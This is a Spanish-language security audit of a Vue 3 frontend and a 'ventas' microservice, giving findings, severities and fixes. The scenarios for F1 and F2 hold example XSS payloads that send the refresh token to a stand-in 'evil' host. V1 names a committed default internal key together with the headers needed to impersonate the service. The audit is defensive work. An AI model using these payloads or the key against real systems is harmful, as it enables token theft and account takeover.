# Auditoría de Seguridad (solo lectura) — Frontend Vue 3 y Microservicio hijo `ventas`
**Proyecto:** Master Gateway (auth centralizada, Zero Trust) — Desarrollo de Software Seguro
**Fecha:** 2026-07-24
**Alcance:** `frontend-vue/src/**` y `services/ventas/**` (out of scope: backend Master, Kong, inventario)

---

## Resumen de hallazgos

| # | Título | Severidad |
|---|--------|-----------|
| F1 | Tokens de sesión (access + refresh) en localStorage | Alto |
| F2 | `:href` con URL del backend sin validar protocolo (XSS almacenado) | Alto |
| F3 | Guard de router sólo verifica presencia de token, no expiración ni rol | Medio |
| F4 | Manejo inconsistente de 401/refresh/403 para rutas "admin" | Medio |
| F5 | Enrutamiento dinámico: `url` del backend sin saneo de formato | Bajo |
| F6 | InventoryView: `fetch` directo a URL controlada por el usuario, sin token | Bajo |
| V1 | Secreto compartido interno con valor por defecto débil y comiteado | Alto |
| V2 | Sin timeout/AbortController al validar contra el Master | Medio |
| V3 | `ventas` publicado directo al host (bypass de Kong) + `/health` abierto | Bajo |
| V4 | Contenedor `ventas` corre como root (sin `USER`) | Bajo |

---

## FRONTEND (frontend-vue/src)

### F1 — Tokens de sesión (accessToken + refreshToken) en localStorage
- **Severidad:** Alto
- **Archivo:línea:**
  - `frontend-vue/src/services/auth.service.ts:16-18` (set `accessToken`, `refreshToken`, `currentRole`)
  - `frontend-vue/src/services/auth.service.ts:52` (getAccessToken)
  - `frontend-vue/src/services/api.ts:12` (lectura para el header), `api.ts:52` (lee refreshToken), `api.ts:56-57` (persiste tras refresh)
- **Riesgo:** localStorage es accesible por cualquier JavaScript de la página. Cualquier XSS (ver F2) permite exfiltrar ambos tokens. El `refreshToken` es de larga vida (`REFRESH_JWT_EXPIRES_IN: 7d`, docker-compose.yml:121), de modo que un robo concede acceso persistente ~7 días aunque rote el accessToken.
- **Escenario concreto:** un payload XSS ejecuta `fetch('https://evil/x?t='+localStorage.getItem('refreshToken'))`. El atacante refresca tokens durante una semana → toma de cuenta (account takeover) completa con el rol de la víctima.
- **Recomendación:** almacenar al menos el refreshToken en cookie `HttpOnly; Secure; SameSite=Strict` emitida por el Master; idealmente también el accessToken. Añadir cabecera CSP restrictiva. El informe del proyecto ya reconoce este riesgo: aquí queda documentada la ubicación exacta y el impacto amplificado por el refresh de 7 días.

### F2 — `:href` con URL del backend sin validar protocolo → XSS almacenado
- **Severidad:** Alto (precondición: permiso de creación/edición de menús)
- **Archivo:línea:** `frontend-vue/src/components/MenuItem.vue:11-17` (clave: `:href="node.url"` en línea 13). No hay allowlist de protocolo.
- **Contraste:** `frontend-vue/src/views/DynamicPageView.vue:52-55` SÍ valida `/^https?:\/\//i` antes de bindear el `:href`. La comprobación existe en el código pero NO se aplica en MenuItem → inconsistencia/olvido.
- **Riesgo:** Vue **no** sanea `javascript:`/`data:`/`vbscript:` en bindings `:href`. `node.url` viene del árbol de menús que devuelve el Master (dato de segundo orden, mostrado a otros usuarios/roles). Un menú cuya `url` no empiece por `/app/` se renderiza como `<a :href="node.url">` sin filtro.
- **Escenario concreto:** un usuario con permiso de gestión de menús crea un menú con `url = "javascript:fetch('//evil/?t='+localStorage.getItem('refreshToken'))"`. Ese menú aparece en el Sidebar de una víctima con más privilegios (p. ej. ADMIN); al hacer clic, el `javascript:` se ejecuta en la sesión de la víctima → robo de tokens (encadena con F1) → escalada de privilegios.
- **Recomendación:** reutilizar la validación de DynamicPageView: permitir sólo rutas internas `/app/...` (router-link) o URLs `http(s)://` para `<a>`; rechazar/normalizar cualquier otro esquema antes de renderizar.

### F3 — Guard de router: sólo presencia de token (sin expiración ni rol)
- **Severidad:** Medio
- **Archivo:línea:** `frontend-vue/src/router/index.ts:49-52` (usa `authService.isAuthenticated()`) → `frontend-vue/src/services/auth.service.ts:69-71` (`return !!this.getAccessToken()`).
- **Riesgo:**
  1. Un accessToken caducado (o cualquier string en `accessToken`) se considera "autenticado" en el cliente: no se decodifica `exp`.
  2. Todas las rutas hijas de `/app` comparten un único `requiresAuth` heredado del padre (index.ts:23) sin control de rol/permiso por ruta. Cualquier rol autenticado puede navegar en el SPA a `/app/users`, `/app/roles`, etc. (las vistas admin se muestran hasta que la API responde 401/403).
- **Escenario concreto:** un usuario con rol VENTAS teclea `/app/users` en la barra de direcciones; el guard lo deja pasar y renderiza la vista de administración de usuarios; sólo falla al llamar la API. Fuga de estructura/UX de administración a roles no autorizados.
- **Nota:** el backend sigue siendo autoritativo (Master valida, `ventas` revalida), por lo que es una debilidad de defensa en profundidad, no un bypass de datos.
- **Recomendación:** decodificar `exp` del JWT y tratar el token expirado como no autenticado; añadir `meta.roles`/`meta.permissions` por ruta y comprobarlos en `beforeEach`; derivar tanto la visibilidad del menú como el guard del rol activo.

### F4 — Manejo inconsistente de refresh/401/403 para rutas "admin"
- **Severidad:** Medio
- **Archivo:línea:** `frontend-vue/src/services/api.ts:35-36` (`isAdminRequest` sobre `/users,/roles,/modules,/menus,/permissions`), `api.ts:63` (`if (!isAdminRequest)` para limpiar sesión y redirigir), `api.ts:74-78` (403 sólo redirige si no es admin).
- **Riesgo:** cuando falla el refresh en un endpoint admin, NO se limpian los tokens ni se redirige: la sesión queda con tokens inválidos en localStorage y el usuario en una pantalla en estado inconsistente. Igual con 403 (no redirige a `/unauthorized`). Debilita la higiene de sesión y puede enmascarar tokens revocados.
- **Escenario concreto:** el refreshToken es revocado en el backend; el admin sigue en `/app/users` con tokens muertos en localStorage indefinidamente (no hay logout automático) hasta recargar manualmente.
- **Recomendación:** manejo uniforme; ante un 401 no recuperable, limpiar siempre tokens y redirigir a `/login`, con independencia de la ruta.

### F5 — Enrutamiento dinámico: `url` del backend usada como path/nombre de ruta sin saneo de formato
- **Severidad:** Bajo
- **Archivo:línea:** `frontend-vue/src/router/dynamic-routes.ts:29, 54, 56, 64, 66-71`.
- **Aspecto correcto (mitiga el riesgo principal):** el componente destino es **siempre** `DynamicPageView` (dynamic-routes.ts:69). **No** existe carga de componente por nombre arbitrario que venga del backend → el riesgo "un componente se cargue por nombre arbitrario" NO está presente. Bien.
- **Riesgo residual:** la única validación de la `url` del backend es `startsWith('/app/')` (línea 54). No se valida charset/formato antes de usarla como `path` (línea 64) y como `name` (`dynamic:${url}`, línea 56). Una `url` rara podría generar paths/nombres de ruta extraños; el impacto queda acotado porque siempre renderiza DynamicPageView y los strings del menú se muestran con `{{ }}` (auto-escapado, DynamicPageView.vue:25-28).
- **Recomendación:** validar la `url` con una allowlist estricta (p. ej. `^\/app\/[a-z0-9\/_-]+$`) antes de `addRoute`, y descartar las que no cumplan.

### F6 — InventoryView: `fetch` directo a URL controlada por el usuario, sin token ni validación
- **Severidad:** Bajo
- **Archivo:línea:** `frontend-vue/src/views/InventoryView.vue:52` (URL desde `localStorage.inventoryApiUrl`), `InventoryView.vue:60` (persiste input), `frontend-vue/src/services/inventario.service.ts:9-13` (`fetch(url)` crudo, sin `Authorization`).
- **Riesgo:** (a) el SPA no reenvía el token Bearer al microservicio de inventario (usa `fetch` nativo, no la instancia `api` con interceptor) → si inventario aplica Zero Trust como `ventas`, la llamada no lleva credenciales; (b) la URL base es controlable por el usuario (input/localStorage) y se consulta sin allowlist. Impacto bajo: es el navegador y el input del propio usuario.
- **Recomendación:** llamar siempre vía el proxy `/inventario` (o `/api`), reenviar el Bearer, y validar/whitelistear la URL base.

### Aspectos correctos / valor agregado — Frontend
- **Sin sinks de XSS por render:** grep sobre todo `frontend-vue/src` de `v-html`, `innerHTML`, `outerHTML`, `eval`, `new Function`, `document.write` → **0 coincidencias**. Todo dato del backend se pinta con `{{ }}` (auto-escapado).
- **AppIcon acota `:is`:** `frontend-vue/src/components/AppIcon.vue:11-15` resuelve el icono contra el objeto `LucideIcons[pascal]` con fallback a `LucideIcons.Box`; `:is` recibe siempre un objeto-componente (nunca un string atacante), por lo que no hay inyección de tag/componente arbitrario.
- **Enlaces externos:** `MenuItem.vue:14-15` y `DynamicPageView.vue:32` usan `target="_blank" rel="noopener noreferrer"` (evita tabnabbing).
- **Flujo de dos fases correcto:** login guarda `tempToken` en sessionStorage (auth.service.ts:7); el `accessToken` sólo se emite en `select-role` (auth.service.ts:16). El guard exige `accessToken`, que no existe sin completar la fase 2 → **no se puede saltar la selección de rol** desde el cliente. `tempToken` nunca se usa como Bearer de recursos (el interceptor sólo adjunta el `accessToken`, api.ts:12). `SelectRoleView.vue:38-40` reexpulsa a `/login` si no hay tempToken.
  - *Nota menor:* la lista de roles mostrada en `SelectRoleView` proviene de sessionStorage (auth.service.ts:55-58); la decisión de autorización debe recaer en el backend (validar que el `roleId` pertenece al usuario ligado al `tempToken`); en el frontend es sólo presentación.
- **Refresh sin recursión:** el refresh usa `axios.post` crudo (api.ts:55), no la instancia con interceptor → evita bucles; hay cola (`pendingQueue`) para 401 concurrentes.

---

## MICROSERVICIO `ventas` (services/ventas/src)

### V1 — Secreto compartido interno con valor por defecto débil y comiteado
- **Severidad:** Alto
- **Archivo:línea:** `services/ventas/src/server.ts:32` (fallback `'change-me-internal-key'`); `docker-compose.yml:122` y `docker-compose.yml:195` (default `local-docker-internal-key` para backend y ventas).
- **Riesgo:** si se despliega sin definir `INTERNAL_API_KEY`, la clave compartida que autentica a los servicios hijos frente a los endpoints internos del Master (`/internals/*`) queda en un valor por defecto **conocido y versionado en el repo**. Cualquiera que lea el repositorio puede suplantar al servicio `ventas` ante el Master.
- **Escenario concreto:** despliegue de demo/academia con las variables por defecto → un atacante llama directamente a `POST /api/internals/validate-token` (u otros `/internals/*`) con `x-internal-api-key: local-docker-internal-key` y `x-internal-service: ventas`, saltándose el control de servicios internos.
- **Recomendación:** eliminar el valor por defecto; fallar al arrancar si `MASTER_INTERNAL_API_KEY`/`INTERNAL_API_KEY` no está definido; cargarlo desde un gestor de secretos y rotarlo.

### V2 — Sin timeout/AbortController en la validación contra el Master
- **Severidad:** Medio
- **Archivo:línea:** `services/ventas/src/server.ts:72-80` (`fetch` sin `signal`/timeout), dentro del bucle `server.ts:70-97` (`retryAttempts` = 3, `retryDelayMs` = 500).
- **Riesgo:** el `fetch` global (undici) usa timeouts por defecto altos (~300 s). Un Master colgado (no caído: acepta la conexión pero no responde) puede bloquear cada intento hasta minutos × 3 reintentos, agotando el manejo de peticiones de `ventas` (amplificación de DoS).
- **Escenario concreto:** el Master queda en estado degradado que acepta TCP pero no responde; cada `GET /ventas/ordenes` se cuelga varios minutos; las conexiones concurrentes agotan el proceso `ventas`.
- **Recomendación:** usar `AbortController` con timeout corto por intento (p. ej. 3-5 s) y mantener el fail-closed actual (503).

### V3 — `ventas` publicado directo al host (bypass de Kong) + `/health` sin auth
- **Severidad:** Bajo
- **Archivo:línea:** `docker-compose.yml:200-201` (`ports: "${VENTAS_PORT:-3006}:3006"`); ruta Kong `/ventas,/health` en `docker-compose.yml:224`; `services/ventas/src/server.ts:47-49` (`/health` abierto).
- **Riesgo:** al exponer 3006 al host, se puede llamar a `ventas` sin pasar por Kong, saltándose plugins del gateway (rate-limiting, etc.). `GET /ventas/ordenes` sigue exigiendo token válido revalidado (no hay bypass de auth), pero se amplía la superficie. `/health` filtra estado del servicio sin autenticación (impacto mínimo).
- **Recomendación:** en producción no publicar 3006 al host; exponer `ventas` sólo por la red interna vía Kong.

### V4 — Contenedor `ventas` corre como root
- **Severidad:** Bajo
- **Archivo:línea:** `services/ventas/Dockerfile:17-27` (sin directiva `USER`; la imagen base ejecuta como root).
- **Riesgo:** una RCE/escape en el proceso Node correría como root dentro del contenedor, facilitando el escalado.
- **Recomendación:** añadir `USER node` (o un usuario sin privilegios) en la etapa runtime.

### Aspectos correctos / valor agregado — `ventas` (Zero Trust bien implementado)
- **Revalidación en cada petición (Zero Trust real):** `server.ts:110` llama a `validateTokenWithMaster` en **cada** `GET /ventas/ordenes`; no cachea ni confía en el frontend. El rol NO se toma del cliente: se deriva de la respuesta del Master (`server.ts:119-121`); `userId`/`roleId`/`roleName` provienen de la validación (`server.ts:123-130`).
- **Fail-CLOSED ante fallo del Master:** si tras los reintentos el Master no responde, lanza excepción y el handler devuelve **503** (`server.ts:109-113`); token inválido → 401 (`server.ts:115-117`); rol no permitido o ausente → 403 (`server.ts:119-121`). Nunca falla abierto. Confirmado por los tests (`server.spec.ts:63-108`).
- **Reintentos sólo para fallos transitorios:** `server.ts:70-97`; ante 401/403 del Master corta de inmediato con `{ valid:false }` (`server.ts:82-84`) — no reintenta credenciales inválidas.
- **Token sólo por `Authorization: Bearer`:** `server.ts:103` + `extractBearerToken` (`server.ts:59-65`) rechaza esquemas no-Bearer.
- **Autorización por rol contra allowlist:** `server.ts:34, 119` (`VENTAS_ALLOWED_ROLES`, por defecto `ADMIN,VENTAS`).
- **Cabeceras internas correctas al Master:** `x-internal-api-key` + `x-internal-service` (`server.ts:76-77`).
- **Sin CORS permisivo:** el servidor no emite `Access-Control-Allow-Origin` (server.ts entero) → un navegador no puede leer respuestas cross-origin (default restrictivo, seguro).
- **Sin secretos hardcodeados salvo el default de V1;** sin endpoints de negocio sin protección (sólo `/health` informativo y `/ventas/ordenes` protegido; el resto → 404, `server.ts:55`).
- **Dockerfile multi-stage** con base `-slim` y `npm ci` (build reproducible).

---

## Conclusión
- **Puntos fuertes:** el microservicio `ventas` implementa Zero Trust de forma correcta (revalidación por petición, fail-closed, rol derivado del Master), y el frontend evita los sinks clásicos de XSS por render (sin `v-html`) y la carga de componentes por nombre arbitrario (DynamicPageView fijo).
- **Prioridad de remediación:** F2 (XSS almacenado vía `:href` de menú) + F1 (tokens en localStorage) forman juntos una cadena de toma de cuenta; V1 (clave interna por defecto comiteada) debe cerrarse antes de cualquier despliegue real.
